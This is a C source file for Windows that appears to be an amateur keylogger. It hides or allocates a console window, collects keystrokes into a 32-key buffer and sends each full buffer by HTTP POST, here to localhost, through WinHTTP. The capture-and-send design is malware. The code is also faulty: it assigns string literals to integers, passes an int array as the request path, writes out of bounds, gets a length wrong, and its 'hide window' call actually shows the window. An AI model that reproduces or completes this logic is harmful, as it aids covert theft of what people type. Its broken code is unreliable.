#include <stdio.h>
#include <Windows.h>
#include <Winhttp.h>

#pragma comment(lib, "winhttp.lib")
#define N 32

void printString(int capture[]) {
	char string[N];
	for (int i = 0; i < N - 1; i++) {
		printf("%d ", capture[i]);
	}
}

int sendCapture(int capture[]) {
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;

	char test = "a";

    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"A WinHTTP Example Program/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, L"localhost",
            INTERNET_DEFAULT_HTTP_PORT, 0);

    // Create an HTTP Request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"POST",
            capture,
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    // Send a Request.
    if (hRequest)
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, sizeof(hRequest), 0,
            0, 0);

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return 1;
}

int main(void) {
	int capture[N], key, l = 0;

	// Hide window
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 1);

	while (1) {
		Sleep(20);
		if (kbhit()) {
			key = getch();

			if (l + 1 == N) {
				capture[l + 1] = "\0";
				sendCapture(capture);

				capture[0] = "\0";
				l = 0;
			}

			if (l < N) {
				capture[l] = key;
				printf("%d ", l);
				l++;
			}
		}
	}

	return 1;
}